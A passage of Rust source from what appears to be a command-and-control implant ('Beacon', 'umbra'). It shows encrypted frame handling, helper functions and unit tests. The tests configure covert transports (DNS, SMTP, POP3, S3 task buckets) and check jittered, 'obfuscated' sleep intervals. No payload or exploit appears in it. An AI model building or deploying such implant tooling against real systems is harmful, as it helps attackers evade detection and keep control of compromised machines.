        let frame = self.seal(wire::MSG_BYE, &upk::map(vec![]))?;
        self.write(&frame)?;
        if let Some(ch) = self.channel.as_mut() {
            let _ = ch.flush();
        }
        Ok(())
    }

    // -- plumbing --------------------------------------------------------
    fn seal(&mut self, msg_type: u8, value: &Value) -> Result<Vec<u8>, String> {
        let sess = self.session.as_mut().ok_or("no session")?;
        sess.seal_value(msg_type, value).map_err(|e| format!("seal: {e}"))
    }

    fn open(&mut self, frame: &[u8]) -> Result<(u8, Value), String> {
        let sess = self.session.as_mut().ok_or("no session")?;
        sess.open_value(frame).map_err(|e| format!("open: {e}"))
    }

    fn write(&mut self, frame: &[u8]) -> Result<(), String> {
        let ch = self.channel.as_mut().ok_or("no channel")?;
        ch.write_frame(frame).map_err(|e| format!("write: {e}"))
    }

    fn read(&mut self) -> Result<Vec<u8>, String> {
        let ch = self.channel.as_mut().ok_or("no channel")?;
        ch.read_frame().map_err(|e| format!("read: {e}"))
    }
}

fn now_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn random_unit() -> f64 {
    let b = crypto::random_bytes(8);
    let mut v = [0u8; 8];
    v.copy_from_slice(&b);
    let n = u64::from_le_bytes(v) >> 11;
    (n as f64) / ((1u64 << 53) as f64)
}

fn sleep_secs(secs: u64) {
    std::thread::sleep(std::time::Duration::from_secs(secs.max(1)));
}

/// Constant-time comparison for authentication tags.
pub fn ct_eq(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }
    let mut diff = 0u8;
    for (x, y) in a.iter().zip(b.iter()) {
        diff |= x ^ y;
    }
    diff == 0
}

/// The number of bytes an uvarint of n occupies.
fn uvarint_len(n: u64) -> usize {
    let mut size = 1;
    let mut value = n;
    while value >= 0x80 {
        value >>= 7;
        size += 1;
    }
    size
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ct_eq_behaves() {
        assert!(ct_eq(b"abc", b"abc"));
        assert!(!ct_eq(b"abc", b"abd"));
        assert!(!ct_eq(b"abc", b"ab"));
    }

    #[test]
    fn the_sleep_is_obfuscated() {
        let mut cfg = Config {
            server: "127.0.0.1:1".into(),
            transport: Transport::Tcp,
            http_path: "/api/v1/beacon".into(),
            agent_id: "test".into(),
            psk: vec![1u8; 32],
            sleep: 100,
            jitter: 20,
            verbose: false,
            dns_resolver: "127.0.0.1:5353".into(),
            dns_domain: "umbra.local".into(),
            ws_path: "/api/v1/beacon".into(),
            ws_host_header: String::new(),
            http_host_header: String::new(),
            http_pad: 0,
            sleep_obfuscate: true,
            proxy: String::new(),
            servers: Vec::new(),
            peer_listen: String::new(),
            vpn_addr: String::new(),
            smtp_addr: String::new(),
            pop3_addr: String::new(),
            s3_endpoint: String::new(),
            s3_region: "us-east-1".into(),
            s3_tasks_bucket: "umbra-tasks".into(),
            s3_results_bucket: "umbra-results".into(),
        };
        let b = Beacon::new(cfg);
        let mut long = 0;
        for _ in 0..200 {
            let v = b.next_interval();
            assert!(v >= 1, "interval {v} is not positive");
            if v > 120 {
                long += 1;
            }
        }
        // The obfuscation has to show up, otherwise it does nothing.
        assert!(long > 0, "the sleep was never obfuscated");
        assert!(long < 200, "every check-in was obfuscated");
    }

    #[test]
    fn jitter_stays_in_window() {
        let mut cfg = Config {
            server: "127.0.0.1:1".into(),
            transport: Transport::Tcp,
            http_path: "/api/v1/beacon".into(),
            agent_id: "test".into(),
            psk: vec![1u8; 32],
            sleep: 100,
            jitter: 20,
            verbose: false,
            dns_resolver: "127.0.0.1:5353".into(),
            dns_domain: "umbra.local".into(),
            ws_path: "/api/v1/beacon".into(),
            ws_host_header: String::new(),
            http_host_header: String::new(),
            http_pad: 0,
            sleep_obfuscate: false,
            proxy: String::new(),
            servers: Vec::new(),
            peer_listen: String::new(),
            vpn_addr: String::new(),
            smtp_addr: String::new(),
            pop3_addr: String::new(),
            s3_endpoint: String::new(),
            s3_region: "us-east-1".into(),
            s3_tasks_bucket: "umbra-tasks".into(),
            s3_results_bucket: "umbra-results".into(),
        };
        cfg.sleep = 100;
        let b = Beacon::new(cfg);
        for _ in 0..200 {
            let v = b.next_interval();
            assert!((80..=120).contains(&v), "interval {v} outside jitter window");
        }
    }
}
